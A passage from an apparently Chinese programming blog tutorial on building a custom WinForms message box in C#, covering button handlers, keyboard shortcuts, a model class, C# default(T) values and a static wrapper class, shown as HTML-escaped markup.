            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Cancel.Location = &lt;span&gt;new&lt;/span&gt; Point(pannelLength - &lt;span&gt;85&lt;/span&gt;, &lt;span&gt;10&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Cancel.TabIndex = &lt;span&gt;1&lt;/span&gt;&lt;span&gt;;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Cancel.Text = sysClass.ssLoadMsgOrDefault(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;SYS000002&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;取消(C)&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;);&lt;span&gt;//&lt;/span&gt;&lt;span&gt;取消(C)&lt;/span&gt;
            &lt;span&gt;this&lt;/span&gt;.btn_Cancel.Margin = &lt;span&gt;new&lt;/span&gt; Padding(&lt;span&gt;0&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;, &lt;span&gt;2&lt;/span&gt;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.btn_Cancel.Click +=&lt;span&gt; btn_Cancel_Click;
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.panelButton.Controls.Add(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.btn_Cancel);
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.panelButton.ResumeLayout();
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (defaultButton ==&lt;span&gt; MessageBoxDefaultButton.Button1)
            {
                &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.btn_Retry.Select();
            }
            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
            {
                &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.btn_Cancel.Select();
            }
            &lt;/span&gt;&lt;span&gt;#endregion&lt;/span&gt;
            &lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
    }

    &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.Text =&lt;span&gt; caption;

    &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.lblMsg.Text =&lt;span&gt; text;
    &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; moreHeight = &lt;span&gt;this&lt;/span&gt;.lblMsg.Height - &lt;span&gt;35&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (moreHeight &amp;gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;)
    {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.Height +=&lt;span&gt; moreHeight;
    }
  }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;　　 代码比较简单，就是把初始化按钮事件和把初始化的弹窗中的按钮添加到布局中的Panel容器里面和一些细节调整，关于方法sysClass.ssLoadMsgOrDefault目前可以不用在意，是我的通用类库，主要是用来实现国际化的，后续会断断续续为大家介绍这块代码。&lt;br/&gt;        按钮绑定事件和键盘响应事件代码如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;57&quot;&gt;
&lt;pre&gt;
&lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; PaintIcon(Icon icon, &lt;span&gt;int&lt;/span&gt; x, &lt;span&gt;int&lt;/span&gt;&lt;span&gt; y)
  {
      Graphics g &lt;/span&gt;= &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.CreateGraphics();
      g.DrawIcon(icon, x, y);
  }

  &lt;/span&gt;&lt;span&gt;void&lt;/span&gt; btn_No_Click(&lt;span&gt;object&lt;/span&gt;&lt;span&gt; sender, EventArgs e)
  {
      &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.DialogResult =&lt;span&gt; DialogResult.No;
  }

  &lt;/span&gt;&lt;span&gt;void&lt;/span&gt; btn_Yes_Click(&lt;span&gt;object&lt;/span&gt;&lt;span&gt; sender, EventArgs e)
  {
      &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.DialogResult =&lt;span&gt; DialogResult.Yes;
  }

  &lt;/span&gt;&lt;span&gt;void&lt;/span&gt; btn_Ignore_Click(&lt;span&gt;object&lt;/span&gt;&lt;span&gt; sender, EventArgs e)
  {
      &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.DialogResult =&lt;span&gt; DialogResult.Ignore;
  }

  &lt;/span&gt;&lt;span&gt;void&lt;/span&gt; btn_Retry_Click(&lt;span&gt;object&lt;/span&gt;&lt;span&gt; sender, EventArgs e)
  {
      &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.DialogResult =&lt;span&gt; DialogResult.Retry;
  }

  &lt;/span&gt;&lt;span&gt;void&lt;/span&gt; btn_Abort_Click(&lt;span&gt;object&lt;/span&gt;&lt;span&gt; sender, EventArgs e)
  {
      &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.DialogResult =&lt;span&gt; DialogResult.Abort;
  }

  &lt;/span&gt;&lt;span&gt;void&lt;/span&gt; btn_Cancel_Click(&lt;span&gt;object&lt;/span&gt;&lt;span&gt; sender, EventArgs e)
  {
      &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.DialogResult =&lt;span&gt; DialogResult.Cancel;
  }

  &lt;/span&gt;&lt;span&gt;void&lt;/span&gt; btn_OK_Click(&lt;span&gt;object&lt;/span&gt;&lt;span&gt; sender, EventArgs e)
  {
      &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.DialogResult =&lt;span&gt; DialogResult.OK;
  }

  &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; frm_MessageBox_KeyUp(&lt;span&gt;object&lt;/span&gt;&lt;span&gt; sender, KeyEventArgs e)
  {
      &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (e.Modifiers ==&lt;span&gt; Keys.None)
      {
          &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (e.KeyCode == Keys.O &amp;amp;&amp;amp; btn_OK != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
          {
              btn_OK_Click(&lt;/span&gt;&lt;span&gt;null&lt;/span&gt;, &lt;span&gt;null&lt;/span&gt;&lt;span&gt;);
          }
          &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (e.KeyCode == Keys.C &amp;amp;&amp;amp; btn_Cancel != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
          {
              btn_Cancel_Click(&lt;/span&gt;&lt;span&gt;null&lt;/span&gt;, &lt;span&gt;null&lt;/span&gt;&lt;span&gt;);
          }
          &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (e.KeyCode == Keys.A &amp;amp;&amp;amp; btn_Abort != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
          {
              btn_Abort_Click(&lt;/span&gt;&lt;span&gt;null&lt;/span&gt;, &lt;span&gt;null&lt;/span&gt;&lt;span&gt;);
          }
          &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (e.KeyCode == Keys.R &amp;amp;&amp;amp; btn_Retry != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
          {
              btn_Retry_Click(&lt;/span&gt;&lt;span&gt;null&lt;/span&gt;, &lt;span&gt;null&lt;/span&gt;&lt;span&gt;);
          }
          &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (e.KeyCode == Keys.I &amp;amp;&amp;amp; btn_Ignore != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
          {
              btn_Ignore_Click(&lt;/span&gt;&lt;span&gt;null&lt;/span&gt;, &lt;span&gt;null&lt;/span&gt;&lt;span&gt;);
          }
          &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (e.KeyCode == Keys.Y &amp;amp;&amp;amp; btn_Yes != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
          {
              btn_Yes_Click(&lt;/span&gt;&lt;span&gt;null&lt;/span&gt;, &lt;span&gt;null&lt;/span&gt;&lt;span&gt;);
          }
          &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (e.KeyCode == Keys.N &amp;amp;&amp;amp; btn_No != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
          {
              btn_No_Click(&lt;/span&gt;&lt;span&gt;null&lt;/span&gt;, &lt;span&gt;null&lt;/span&gt;&lt;span&gt;);
          }
      }
      &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (e.Modifiers == Keys.Control &amp;amp;&amp;amp; e.KeyCode ==&lt;span&gt; Keys.C)
      {
          &lt;/span&gt;&lt;span&gt;string&lt;/span&gt; mCopyText = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;-------------------------------&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
          mCopyText &lt;/span&gt;+= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
          mCopyText &lt;/span&gt;+= lblMsg.Text + &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\n&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
          mCopyText &lt;/span&gt;+= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;-------------------------------&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
          Clipboard.SetText(mCopyText);
      }
  }

  &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; frm_MessageBox_Paint(&lt;span&gt;object&lt;/span&gt;&lt;span&gt; sender, PaintEventArgs e)
  {
      Icon msgIcon;
      &lt;/span&gt;&lt;span&gt;switch&lt;/span&gt;&lt;span&gt; (icon)
      {
          &lt;/span&gt;&lt;span&gt;case&lt;/span&gt;&lt;span&gt; MessageBoxIcon.Error:
              msgIcon &lt;/span&gt;=&lt;span&gt; System.Drawing.SystemIcons.Error;
              &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
          &lt;/span&gt;&lt;span&gt;case&lt;/span&gt;&lt;span&gt; MessageBoxIcon.Question:
              msgIcon &lt;/span&gt;=&lt;span&gt; System.Drawing.SystemIcons.Question;
              &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
          &lt;/span&gt;&lt;span&gt;case&lt;/span&gt;&lt;span&gt; MessageBoxIcon.Exclamation:
              msgIcon &lt;/span&gt;=&lt;span&gt; System.Drawing.SystemIcons.Exclamation;
              &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
          &lt;/span&gt;&lt;span&gt;default&lt;/span&gt;&lt;span&gt;:
              msgIcon &lt;/span&gt;=&lt;span&gt; System.Drawing.SystemIcons.Information;
              &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
      }

      e.Graphics.DrawIcon(msgIcon, &lt;/span&gt;&lt;span&gt;40&lt;/span&gt;, &lt;span&gt;20&lt;/span&gt;&lt;span&gt;);
  }

}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 以及弹窗实体类：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
&lt;span&gt;///&lt;/span&gt;&lt;span&gt; 弹出框实体
&lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; MessageBoxModel
{
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 弹出框标题
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; FormText { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }

    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 弹出框宽度
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; FormWidth { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }

    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 弹出框高度
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; FormHeight { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }

    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 弹出框消息内容
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; MsgText { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }

    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 文字大小
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; FontSize { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }

    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; “是”按钮标题
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; YesButtonText { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }

    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; “否”按钮标题
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; NoButtonText { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }

    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; “取消”按钮标题
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; CancleButtonText { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }

    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 弹出框类型（提示型、选择型等）
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; MessageBoxButtons MsgButton =&lt;span&gt; MessageBoxButtons.OK;

    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 弹出框中显示的图标
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; MessageBoxIcon MsgIcon =&lt;span&gt; MessageBoxIcon.Information;

    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 弹出框默认选中的按钮
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; MessageBoxDefaultButton MsgxDefaultButton = MessageBoxDefaultButton.Button1;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 细心的读者会发现，博主在实例弹窗实体的时候，有个语法糖：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
 &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 消息弹出框参数实体
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    MessageBoxModel _MessageBoxModel = &lt;span&gt;default&lt;/span&gt;(MessageBoxModel);
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;  default(T) 这是C# 7.1的关键字新用法，主要用法是默认值表达式，default对应各种类型生成默认值列表如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/116076/202003/116076-20200319004840000-1938910940.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;










&lt;p&gt;　　罗列一下上述列表中常见类型对应的值&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;default&lt;/span&gt;(&lt;span&gt;string&lt;/span&gt;) &lt;span&gt;//&lt;/span&gt;&lt;span&gt; null&lt;/span&gt;
&lt;span&gt;default&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt;) &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 0&lt;/span&gt;
&lt;span&gt;default&lt;/span&gt;(&lt;span&gt;int&lt;/span&gt;?) &lt;span&gt;//&lt;/span&gt;&lt;span&gt; null&lt;/span&gt;
&lt;span&gt;default&lt;/span&gt;(&lt;span&gt;dynamic&lt;/span&gt;) &lt;span&gt;//&lt;/span&gt;&lt;span&gt; null&lt;/span&gt;
&lt;span&gt;default&lt;/span&gt;(DateTime) &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 0001/01/01 0:00:00&lt;/span&gt;
&lt;span&gt;default&lt;/span&gt;(DateTime?) &lt;span&gt;//&lt;/span&gt;&lt;span&gt; null&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; 　篇幅有限，具体深入了解请大家自行百度看看微软文档的解释。&lt;br/&gt;     以上是窗体代码解析，窗体创建好了，最后一步，创建一个实体类(暂时命名KzxMessageBox)用来调用弹窗的窗体显示，具体代码如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;95&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; KzxMessageBox
{
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 标题 
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;&lt;span&gt; caption;

    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 按钮(默认“OK”)
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt;&lt;span&gt; MessageBoxButtons buttons;

    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 图标(默认“information”)
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt;&lt;span&gt; MessageBoxIcon icon;

    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 默认按钮（默认“button1”）
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt;&lt;span&gt; MessageBoxDefaultButton defaultButton;

    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 静态构造函数，初始化数据
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;static&lt;/span&gt;&lt;span&gt; KzxMessageBox()
    {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (SysVar.loginType == &lt;span&gt;1&lt;/span&gt;&lt;span&gt;)
        {
            caption &lt;/span&gt;= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Stephen's UserControl&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
        }
        &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
        {
            caption &lt;/span&gt;= sysClass.ssLoadMsgOrDefault(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;SYS000008&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Stephen's UserControl&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
        }
        buttons &lt;/span&gt;=&lt;span&gt; MessageBoxButtons.OK;
        icon &lt;/span&gt;=&lt;span&gt; MessageBoxIcon.Information;
        defaultButton &lt;/span&gt;=&lt;span&gt; MessageBoxDefaultButton.Button1;
    }

    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 显示具有指定文本、标题、按钮、图标和默认按钮的消息框
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;text&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;文本&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; DialogResult Show(&lt;span&gt;string&lt;/span&gt;&lt;span&gt; text)
    {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; Show(text, buttons, icon, defaultButton, &lt;span&gt;null&lt;/span&gt;&lt;span&gt;);
    }

    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 显示具有指定文本、标题、按钮、图标和默认按钮的消息框，add by zhang.jz 2019.05.10
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;text&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;文本&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; DialogResult Show(&lt;span&gt;string&lt;/span&gt; text, &lt;span&gt;int&lt;/span&gt; pFormWidth = &lt;span&gt;0&lt;/span&gt;, &lt;span&gt;int&lt;/span&gt; pFormHeight = &lt;span&gt;0&lt;/span&gt;&lt;span&gt;)
    {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; Show(text, buttons, icon, defaultButton, &lt;span&gt;null&lt;/span&gt;&lt;span&gt;, pFormWidth, pFormHeight);
    }

    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 显示具有指定文本、标题、按钮、图标和默认按钮的消息框
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;text&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;parent&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; DialogResult Show(&lt;span&gt;string&lt;/span&gt;&lt;span&gt; text, Form parent)
    {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; Show(text, buttons, icon, defaultButton, parent);
    }

    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 显示具有指定文本、标题、按钮、图标和默认按钮的消息框
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;text&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;文本&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;buttons&quot;&amp;gt;&lt;/span&gt;&lt;span&gt;按钮&lt;/span&gt;&lt;span&gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; DialogResult Show(&lt;span&gt;string&lt;/span&gt;&lt;span&gt; text, MessageBoxButtons buttons)
    {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; Show(text, buttons, icon, defaultButton, &lt;span&gt;null&lt;/span&gt;&lt;span&gt;);
    }

    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 显示具有指定文本、标题、按钮、图标和默认按钮的消息框
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;text&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;buttons&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;param name=&quot;parent&quot;&amp;gt;&amp;lt;/param&amp;gt;&lt;/span&gt;
